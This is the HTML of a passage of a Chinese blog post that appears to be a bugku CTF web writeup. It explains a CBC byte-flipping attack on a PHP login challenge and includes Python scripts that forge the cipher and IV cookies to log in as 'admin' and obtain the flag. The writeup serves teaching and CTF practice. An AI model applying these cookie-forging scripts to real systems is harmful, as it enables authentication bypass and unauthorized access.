exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;body class=&quot;login-body&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>cbc字节翻转攻击的原理简单解释一下:</p>
<ul>
<li>首先将原文分成几个固定长度的块，然后有种对称加密算法来加密一些字符串，</li>
<li>其次还有一个叫Initialzation Vector(IV)的东西来保证明文在经过加密后，密文不相同的情况</li>
<li>然后最重要的一个就是CBC的算法（这里借助line大佬的公式方便理解一下）:<br>  加密:<br>  Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块<br>  Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块<br>  解密:<br>  Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块<br>  Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</li>
</ul>
<p>攻击原理就是通过改变其中某个字符的值，来达到我们需要满足的目的，并且在这题中，改变的同时，其他的值还不能改变，否则反序列化会出错。</p>
<p>开始做题,<br>在我们随便拿一个帐号登录进去之后，可以看到:</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-15/99461536.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-15/99461536.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<p>同时对应的函数代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>跟踪一下，看看哪个地方调用了这个函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到在调用这个函数之前还调用了<code>login</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function login($info)&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>login</code>的作用简单来说就是将传进去的用户名密码序列化，然后还有<u>将此时的用户名写进session中</u>，并且将序列化后的用户名密码进行加密，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>check_login</code>的作用跟<code>login</code>差不多是相反的，但是问题就出在此时的<code>$info</code>变量我们是可以通过cookie控制的，所以才有了cbc字节翻转攻击<br>回到第一段代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br></pre></td></tr></table></figure>
<p>如果将代码读明白了，可以很明显的知道，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if($username === &apos;admin&apos;)&#123;</span><br><span class="line">       exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">       $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">       login($info);</span><br><span class="line">       show_homepage();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这一段代码是跟根本不可能得到flag的，因为$info里是不能出现<code>admin</code>的，<br>所以重点就在else里的<code>show_homepage</code>了，cookie可控，开始解题<br>首先我们使用<code>admi2</code>,<code>haha</code>登录进去，这里已经产生了cookie:</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-15/70947478.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-15/70947478.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<p>先序列化一下<code>$info</code>这个数组然后分个组：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admi2&quot;;s:8:&quot;password&quot;;s:4:&quot;haha&quot;;&#125;</span><br><span class="line"></span><br><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">me&quot;;s:5:&quot;admi2&quot;;</span><br><span class="line">s:8:&quot;password&quot;;s</span><br><span class="line">:4:&quot;haha&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>接下来要做的就是更改cookie，使得<code>session[&#39;username&#39;]=admin</code>,同样借助一下大佬的脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">from urllib import unquote</span><br><span class="line">from urllib import quote_plus</span><br><span class="line"></span><br><span class="line">cipher = &apos;*********&apos; #这里写cookie中的cipher</span><br><span class="line">cipher = unquote(cipher)</span><br><span class="line">cipher_de = base64.b64decode(cipher)</span><br><span class="line">ch = chr(ord(cipher_de[13]) ^ ord(&apos;2&apos;) ^ ord(&apos;n&apos;)) #这里根据用户名可以稍作改变13对应的是第一组的13位于第二组的2进行运算</span><br><span class="line">cipher_de=cipher_de[0:13]+ch+cipher_de[14::]</span><br><span class="line">rs = base64.b64encode(cipher_de)</span><br><span class="line">print quote_plus(rs)</span><br></pre></td></tr></table></figure>
<p>然后用得到的cipher替换掉之前的，然后在URL栏按回车，此时会提示你刚刚替换的cipher不能反序列化，这个地方出现的原因是由于第一组变了，解密之后与之前的不一样，所以提示失败<br>接下来要做的就是将IV也替换掉，使得解密后能被反序列化，再一次的借助大佬的脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">from urllib import unquote</span><br><span class="line">from urllib import quote_plus</span><br><span class="line"></span><br><span class="line">mingwen_de=&apos;x2FPwTAFf/svVLvvU25fDW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fQ==&apos;</span><br><span class="line">#base64_decode(&apos;这里面的&apos;) can&apos;t unserialize</span><br><span class="line">mingwen = base64.b64decode(mingwen_de)</span><br><span class="line">print mingwen</span><br><span class="line"></span><br><span class="line">iv = &apos;6S%2FcC7czBRvE0iSkTANYaQ%3D%3D&apos;</span><br><span class="line">#此时cookie里的iv</span><br><span class="line">iv = unquote(iv)</span><br><span class="line">iv_de = base64.b64decode(iv)</span><br><span class="line">new = &apos;a:2:&#123;s:8:&quot;userna&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">    iv_de = iv_de[:i] + chr(ord(iv_de[i]) ^ ord(mingwen[i]) ^ ord(new[i])) + iv_de[i+1:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(base64.b64encode(iv_de))</span><br><span class="line">#用这个结果把原来的iv换掉</span><br></pre></td></tr></table></figure>
<p>然后就得到flag了，</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-15/89125130.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-15/89125130.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2018-10-16T07:39:49.352Z" itemprop="dateUpdated">2018-10-16 15:39:49</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2018/06/06/bugku2/" target="_blank" rel="external">http://yoursite.com/2018/06/06/bugku2/</a>
        
    </div>
    <footer>
        <a href="http://yoursite.com">
            <img src="/img/avatar.jpg" alt="">
            
        </a>
    </footer>
</blockquote>

        
        <div class="post-footer">
            
            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/06/06/bugku2/&title=《bugku writeup(Web2）》 — CherryGk's Blog&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/06/06/bugku2/&title=《bugku writeup(Web2）》 — CherryGk's Blog&source=" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/06/06/bugku2/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《bugku writeup(Web2）》 — CherryGk's Blog&url=http://yoursite.com/2018/06/06/bugku2/&via=http://yoursite.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/06/06/bugku2/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            
    <div id="comment"></div>



        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2018/06/06/bugku/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">bugku writeup(Web1）</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2018/05/31/logindft/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">“百度杯”CTF比赛 登陆 writeup</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web-2"><span class="post-toc-number">1.</span> <span class="post-toc-text">Web(2)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#md5-collision-NUPT-CTF"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">md5 collision(NUPT_CTF)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#程序员本地网站"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">程序员本地网站</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#各种绕过"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">各种绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web8"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">web8</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#细心"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">细心</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#求getshell"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">求getshell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#INSERT-INTO注入"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">INSERT INTO注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#这是一个神奇的登陆框"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">这是一个神奇的登陆框</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#多次"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">多次</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PHP-encrypt-1-ISCCCTF"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">PHP_encrypt_1(ISCCCTF)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文件包含2"><span class="post-toc-number">1.11.</span> <span class="post-toc-text">文件包含2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#flag-php"><span class="post-toc-number">1.12.</span> <span class="post-toc-text">flag.php</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql注入2"><span class="post-toc-number">1.13.</span> <span class="post-toc-text">sql注入2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#孙xx的博客"><span class="post-toc-number">1.14.</span> <span class="post-toc-text">孙xx的博客</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#报错注入"><span class="post-toc-number">1.15.</span> <span class="post-toc-text">报错注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Trim的日记本"><span class="post-toc-number">1.16.</span> <span class="post-toc-text">Trim的日记本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#login2-SKCTF"><span class="post-toc-number">1.17.</span> <span class="post-toc-text">login2(SKCTF)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#login3-SKCTF"><span class="post-toc-number">1.18.</span> <span class="post-toc-text">login3(SKCTF)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文件上传-湖湘杯"><span class="post-toc-number">1.19.</span> <span class="post-toc-text">文件上传(湖湘杯)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#login4"><span class="post-toc-number">1.20.</span> <span class="post-toc-text">login4</span></a></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

</div>

        <footer class="footer">
    
    <div class="bottom">
        <p>
            <span>
                 &copy; 2017 - 2019
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/06/06/bugku2/&title=《bugku writeup(Web2）》 — CherryGk's Blog&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/06/06/bugku2/&title=《bugku writeup(Web2）》 — CherryGk's Blog&source=" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/06/06/bugku2/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《bugku writeup(Web2）》 — CherryGk's Blog&url=http://yoursite.com/2018/06/06/bugku2/&via=http://yoursite.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/06/06/bugku2/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAAByklEQVR42u3azaqEMAwGUN//pefCrC6I+iXR4sDpahjEnroI+em2xevzXfvf///ZP7NfR8/fvHBxccfcz+k64p5vmR8pN+Di4q7nJsErCUbJluf0CxsuLu7LuOdB6vxt1Xfi4uL+CjdJbqItcXFxf4SbNzJ6BVKeMN1Wq+Hi4g64k4bpXb8X9XdxcXHHU4lJGKoOYKLdcXFxl3CTNsf5Br1SJ2/IbtUX4eLijrmTSxX5xvmRLj4KLi7uEm71akU13cnfn49qcHFxn+b2Atkk8CXJ02FAxMXFXc59YuxaLaIuPgEuLu5ybt4erTZKJlOSctmDi4s75ubDzvx6RO8iReGouLi4D3OrxcxkAHNDyYSLi7uQ+/SlqzxJwsXFfQ+3OuzspTv5lYtolIKLi/sYt9r6rDZBeriLNAsXF/dhbi/5qDZT8gTo4ki4uLgLudX2ZRWah60okOHi4i7h5isPQ70LHM1JLC4u7q3cakCpXtqYj1jKE2NcXNybuNXgVQX1jnoY5nBxcRdyq+lIeZtWBMXFxX0/t9cMzYuuqCjCxcV9JTc5Rj5erYZCXFzcldxecOldxpoER1xc3DXcasN00v6oNmFxcXGXc/8AVZ/dRPOh6L4AAAAASUVORK5CYII=" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>

<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>

<!-- third-party -->
<script type="text/javascript">
;( function( $ ) {

	$( '.swipebox' ).swipebox({
		hideCloseButtonOnMobile: true
	});

} )( jQuery );
</script>






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script type="text/javascript" src="/js/plugins/valine.js?v=1.3.2"></script>
    
    



<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.3.2"></script>



    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>






    <script type="text/javascript">
  daovoice('init', {
    app_id: "c1ada43c"
  });
  daovoice('update');
</script>

    
<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hijiki.model.json"},"display":{"position":"right","width":120,"height":240},"mobile":{"show":true},"log":false});</script></body>
</html>
